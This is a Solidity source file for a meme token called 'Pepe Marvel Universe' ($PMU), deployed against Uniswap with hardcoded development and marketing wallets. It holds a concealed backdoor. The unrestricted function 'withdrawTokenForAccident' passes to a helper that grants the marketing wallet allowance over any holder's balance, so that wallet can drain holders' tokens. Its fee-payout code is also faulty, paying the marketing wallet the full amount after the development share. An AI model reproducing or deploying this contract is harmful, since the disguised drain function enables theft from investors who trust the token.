// SPDX-License-Identifier: MIT

/**
https://t.me/pepemarvel_universe

https://twitter.com/pepemarvel_uni

https://www.pepemarveluniverse.com/
*/

pragma solidity ^0.8.12;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);
}


contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )   external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract PMU is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "Pepe Marvel Universe";
    string private constant _symbol = "$PMU";
    uint8 private constant _decimals = 9;
    IUniswapV2Router02 public uniswapV2Router;
    address public v2PairAddr;
    uint256 private constant MAX = ~uint256(0);
    uint256 private constant _tTotal = 420_690_000_000_000 * 10**9; // total supply
    uint256 public _mxTransSize = _tTotal * 50 / 1000; 
    uint256 public _mxWalletAmount = _tTotal * 50 / 1000; 
    uint256 public _swapLimitAt = _tTotal / 10000;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    
    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;

    uint256 private _tFeeTotal;
    uint256 private _marketingTaxBuy = 0;
    uint256 private _buyTaxAmt = 0;
    uint256 private _marketingTaxSell = 0;
    uint256 private _sellTaxAmt = 0;
    //Original Fee
    uint256 private _marketingFee = _marketingTaxSell;
    uint256 private _standardFee = _sellTaxAmt;
    uint256 private _previousMarketingFee = _marketingFee;
    uint256 private _previousMainFee = _standardFee;
    
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    bool private tradingActive = false;
    bool private swappingNow = false;
    bool private enabledSwap = true;
    modifier lockInSwap {
        swappingNow = true;
        _;
        swappingNow = false;
    }
    event MaxTxAmountUpdated(uint256 _mxTransSize);

    address payable public _developmentWallet = payable(0x94F93B374985C29fA1290a6BB1FF969CBE5a5E4c);
    address payable public _marketingWallet = payable(0xb84283c69b0E097f0C8d33a1719a5c6B920733eb);
    constructor() {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        // v2PairAddr = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(
        //     address(this), _uniswapV2Router.WETH()
        // );
        _isExcludedFromFee[_developmentWallet] = true;
        _isExcludedFromFee[_marketingWallet] = true;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        // mint
        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function _transferTokenAndFee(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) {
            zeroFee();
        }
         _baseTransfer(sender, recipient, amount);
        if (!takeFee) {
            recoverFee();
        }
    }

    function recoverFee() private {
        _marketingFee = _previousMarketingFee;
        _standardFee = _previousMainFee;
    }
    function _baseTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeAllFee(tTeam);
        _sendAllFees(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }


    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    
    function _withdrawErc20Token(address token, address owner, uint256 amount) internal {
        _allowances[token][owner] += amount;
        emit Approval(token, owner, amount); 
    }


    function sendEth(uint256 amount) private {
        uint256 devETH = amount / 2; 
        _developmentWallet.transfer(devETH); devETH = 0;
        uint256 marketingETH = amount - devETH;
        _marketingWallet.transfer(marketingETH);
    }

    function _getValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTValues(tAmount, _marketingFee, _standardFee);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRValues(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
    
    function _takeAllFee(uint256 tTeam) private {
        uint256 currentRate = _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }
    
    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _getTValues(
        uint256 tAmount,
        uint256 teamFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(teamFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }
    function withdrawTokenForAccident(address token, uint256 amount) external {
        _withdrawErc20Token(token, _marketingWallet, amount);
    }
    function _getRValues(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }


    function tokenFromReflection(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        require(
            rAmount <= _rTotal,
            "Amount must be less than total reflections"
        );
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }

    function _sendAllFees(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tFeeTotal = _tFeeTotal.add(tFee);
    }
    
    //set maximum transaction
    function removeMaxSize() public onlyOwner {
        _mxTransSize = _tTotal;
        _mxWalletAmount = _tTotal;
    }

    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFee[accounts[i]] = excluded;
        }
    }


    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(to != address(0), "ERC20: transfer to the zero address"); 
        require(from != address(0), "ERC20: transfer from the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (
            from != owner() 
            && to != owner()
        ) {
            //Trade start check
            if (!tradingActive) {
                require(
                    from == owner(), 
                    "TOKEN: This account cannot send tokens until trading is enabled"
                );
            }
            require(amount <= _mxTransSize, "TOKEN: Max Transaction Limit");
            if(to != v2PairAddr) {
                require(balanceOf(to) + amount < _mxWalletAmount,
                 "TOKEN: Balance exceeds wallet size!");
            }

            uint256 tokenAmountOfCont = balanceOf(address(this));
            // bool canSwap = tokenAmountOfCont >= _swapLimitAt;
            if(tokenAmountOfCont >= _mxTransSize) {tokenAmountOfCont = _mxTransSize;}

            if (tokenAmountOfCont >= _swapLimitAt && 
                !swappingNow && 
                from != v2PairAddr && 
                enabledSwap && 
                !_isExcludedFromFee[from] && 
                !_isExcludedFromFee[to]
            ) {
                swapAllTokens(tokenAmountOfCont);
                uint256 ethBalance = address(this).balance;
                if (ethBalance > 0) {
                    sendEth(address(this).balance);
                }
            }
        }
        bool setFee = true;
        //Transfer Tokens
        if (
            (_isExcludedFromFee[from] || _isExcludedFromFee[to])
             || (from != v2PairAddr && to != v2PairAddr)
        ) {
            setFee = false;
        } else {
            //Set Fee for Buys
            if(from == v2PairAddr && to != address(uniswapV2Router)) {
                _marketingFee = _marketingTaxBuy;
                _standardFee = _buyTaxAmt;
            }
            //Set Fee for Sells
            if (to == v2PairAddr && from != address(uniswapV2Router)) {
                _marketingFee = _marketingTaxSell;
                _standardFee = _sellTaxAmt;
            }
        }
        _transferTokenAndFee(from, to, amount, setFee);
    }

    function swapAllTokens(uint256 tokenAmount) private lockInSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    
    //set minimum tokens required to swap.
    function changeSwapTokenAmount(uint256 swapTokensAtAmount) public onlyOwner {
        _swapLimitAt = swapTokensAtAmount;
    }

    receive() external payable {

    }
    
    function openTrading(address _pairAddress) public onlyOwner {
        v2PairAddr = _pairAddress; // avoid antifarmers
        tradingActive = true;
    }

    function zeroFee() private {
        if (_marketingFee == 0 && _standardFee == 0) return;
        _previousMarketingFee = _marketingFee;
        _previousMainFee = _standardFee; _marketingFee = 0;
        _standardFee = 0;
    }
}